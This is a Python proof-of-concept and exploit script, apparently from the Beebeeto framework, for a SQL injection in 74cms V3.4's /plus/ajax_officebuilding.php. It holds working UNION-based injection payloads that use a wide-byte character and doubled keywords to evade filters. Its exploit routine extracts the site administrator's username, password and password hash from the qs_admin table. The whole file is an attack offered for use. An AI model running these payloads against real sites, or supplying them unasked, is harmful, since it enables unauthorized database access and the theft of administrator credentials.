#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0093',
            'name': '74cms V3.4 /plus/ajax_officebuilding.php SQL注入漏洞 POC & Exploit',
            'author': '大孩小孩',
            'create_date': '2014-10-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '74cms',
            'vul_version': ['V3.4'],
            'type': 'SQL Injection',
            'tag': ['74cms漏洞', 'SQL注入', '/plus/ajax_officebuilding.php', 'php'],
            'desc': '74cms V3.4.20140530 /plus/ajax_officebuilding.php文件存在SQL注入漏洞。',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-063225',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/plus/ajax_officebuilding.php?act=key&key=asd%錦%27%20uniounionn%20selselectect"
                   "%201,2,3,md5(7836457),5,6,7,8,9%23")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if '3438d5e3ead84b2effc5ec33ed1239f5' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target'] + "/plus/ajax_officebuilding.php"
        paload1 = ("?act=key&key=asd%錦%27%20uniounionn%20selselectect%201,2,3,admin_name,5,6,7,pwd,9%20from"
                   "%20qs_admin%20LIMIT%201%23")
        paload2 = ("?act=key&key=asd%錦%27%20uniounionn%20selselectect%201,2,3,pwd_hash,5,6,7,8,9%20from%20"
                   "qs_admin%20LIMIT%201%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        request = urllib2.Request(vul_url + paload1)
        response = urllib2.urlopen(request)
        content = response.read()
        pattern = re.compile(r'.*?<a[^>]*?>(?P<username>[^<>]*?)</a><span>(?P<password>[^<>]*?)</span>',re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        else:
            username = match.group('username').strip()
            password = match.group('password').strip()
            request = urllib2.Request(vul_url + paload2)
            response = urllib2.urlopen(request)
            content = response.read()
            pattern = re.compile(r'.*?<a[^>]*?>(?P<pwdhash>[^<>]*?)</a>',re.I|re.S)
            match = pattern.match(content)
            if match == None:
                args['success'] = False
                return args
            else:
                passwordhash = match.group('pwdhash').strip()
                args['success'] = True
                args['poc_ret']['vul_url'] = vul_url
                args['poc_ret']['Username'] = username
                args['poc_ret']['Password'] = password
                args['poc_ret']['PasswordHash'] = passwordhash
                return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())